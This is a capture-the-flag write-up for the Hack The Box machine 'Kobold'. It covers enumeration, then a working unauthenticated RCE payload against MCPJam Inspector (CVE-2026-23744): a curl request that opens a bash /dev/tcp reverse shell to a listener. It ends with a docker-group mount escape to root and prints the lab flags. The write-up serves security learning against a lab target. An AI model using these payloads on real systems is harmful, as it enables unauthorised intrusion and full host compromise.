# Kobold: Hack The Box Writeup

**Machine:** Kobold  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** April 2026  

---

## Summary

Kobold is an easy Linux machine centred around modern container management tooling and recent CVEs. The attack chain begins with subdomain enumeration to discover an exposed MCPJam Inspector instance, which is vulnerable to unauthenticated RCE (CVE-2026-23744 / GHSA-232v-j27c-5pp6). A crafted POST request to the `/api/mcp/connect` endpoint delivers a reverse shell as `ben`. Privilege escalation to root abuses the `docker` group: `newgrp docker` activates the suppressed group membership, after which a standard docker mount escape gives a root shell on the host.

**Key techniques:** Subdomain enumeration · CVE-2026-23744 MCPJam Inspector RCE · Docker group privilege escalation · Container mount escape

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T5 10.129.21.96
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    nginx: redirects to http://kobold.htb/
3552/tcp open  http    Arcane Docker Management / MCPJam Inspector
8080/tcp open  http    PrivateBin
```

Add the hostname to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.21.96  kobold.htb" >> /etc/hosts'
```

---

## Enumeration

### Subdomain Enumeration

With a hostname in scope, vhost enumeration is mandatory before going deep on any single vector:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://kobold.htb/ -H "Host: FUZZ.kobold.htb" \
  -fw 10
```

Two subdomains resolve: `mcp.kobold.htb` and `bin.kobold.htb`. Add both:

```bash
sudo sh -c 'echo "10.129.21.96  mcp.kobold.htb bin.kobold.htb" >> /etc/hosts'
```

### mcp.kobold.htb: MCPJam Inspector

Navigating to `https://mcp.kobold.htb:3552` reveals an instance of Arcane (v1.13.0) and the MCPJam Inspector, a local-first development platform for MCP (Model Context Protocol) servers.

The MCPJam Inspector exposes an HTTP API intended for local development use. Versions 1.4.2 and earlier are vulnerable to unauthenticated RCE via **CVE-2026-23744 / GHSA-232v-j27c-5pp6**: the `/api/mcp/connect` endpoint accepts a `serverConfig` object containing a `command` and `args` that the server executes directly to initiate an MCP connection: no authentication required.

### bin.kobold.htb: PrivateBin

`https://bin.kobold.htb` hosts PrivateBin v2.0.2. The template-switching feature is enabled, and this version is vulnerable to an LFI via the `template` cookie (GHSA-g2j9-g8r5-rg82 / CVE-2025-64714). The LFI was confirmed working: sending a cookie pointing to a known PHP file on the mounted data volume returns 0 bytes rather than the default 24402-byte page, proving PHP inclusion: however all useful PHP functions (`shell_exec`, `system`, `file_put_contents`) are restricted by `open_basedir` and PHP-FPM configuration inside the container, making it a dead end for this box. The intended path does not require it.

---

## Initial Access: MCPJam Inspector RCE (CVE-2026-23744)

Because the MCPJam Inspector listens on `0.0.0.0` by default, the `/api/mcp/connect` endpoint is reachable externally. The `serverConfig.command` and `serverConfig.args` fields are passed directly to the system as a process spawn: no sanitisation, no authentication.

**Set up a listener:**

```bash
nc -lvnp 4444
```

**Send the reverse shell payload:**

```bash
curl -sk -X POST https://mcp.kobold.htb:3552/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.12/4444 0>&1"],
      "env": {"PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"}
    },
    "serverId": "pwned"
  }'
```

The request hangs: shell received on the listener:

```
connect to [10.10.15.12] from (UNKNOWN) [10.129.21.96] 54312
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

```bash
cat /home/ben/user.txt
# 89740a1635e108c39c2f3411650cca9d
```

---

## Privilege Escalation: Docker Group Escape

### Enumeration

Running linpeas reveals that `ben` has a suppressed `docker` group membership: it is not the active GID at login, so it does not appear in the initial `id` output, but it is available and can be activated without a password.

<!-- Unintended way -->

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

cat /etc/group | grep docker
# docker:x:111:alice
```

At first glance it looks like only `alice` has docker access. But linpeas flags the group membership for `ben` as well. Testing it:

```bash
newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

No password required. The Docker daemon socket is now accessible.

### Docker Mount Escape

Check available images:

```bash
docker images
```

```
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   8 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
```

Membership in the `docker` group allows running containers with arbitrary volume mounts. Mounting the host root filesystem (`/`) into a container at `/mnt` and using `chroot` gives full read/write access to the host as root:

```bash
docker run -v /:/mnt --rm -it mysql chroot /mnt bash
```

```bash
whoami
# root

cat /root/root.txt
# 1e078be1c8994f86d76ee7fb8a602f6e
```

---

<img width="1196" height="683" alt="Screenshot 2026-04-28 103634" src="https://github.com/user-attachments/assets/59e9c8dd-2fbc-4e6a-8d6f-a862234dff3c" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Unauthenticated RCE (CVE-2026-23744 / GHSA-232v-j27c-5pp6) | MCPJam Inspector `/api/mcp/connect` | Remote code execution as `ben` |
| Docker group misconfiguration | `ben` has suppressed `docker` group membership | Full host compromise via container mount escape |

---

## Key Takeaways

- **Vhost enumeration is not optional**: `mcp.kobold.htb` would have been missed entirely without subdomain enumeration at the start of recon. The entire attack surface lives on that vhost.
- **New tooling introduces new CVEs**: MCPJam Inspector is a recent developer tool. Its default `0.0.0.0` binding turns a local development convenience into a network-exposed RCE endpoint. Always check the version of any running service against recent advisories.
- **`newgrp` activates suppressed group memberships without a password**: `ben`'s initial `id` output did not show the `docker` group because it was not the active GID at login. `newgrp docker` switches the active group silently. This is easy to miss if you only check `id` and move on; automated tools like linpeas catch it.
- **Docker group membership equals root**: any user who can run containers can mount `/` into one and `chroot` into the host filesystem. This is a well-documented but still common misconfiguration in self-hosted environments.
- **Shell stabilisation is not required for docker escape**: the `docker run -it` command works from an unstabilised shell. Stabilising beforehand simply makes the interactive session cleaner.

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*

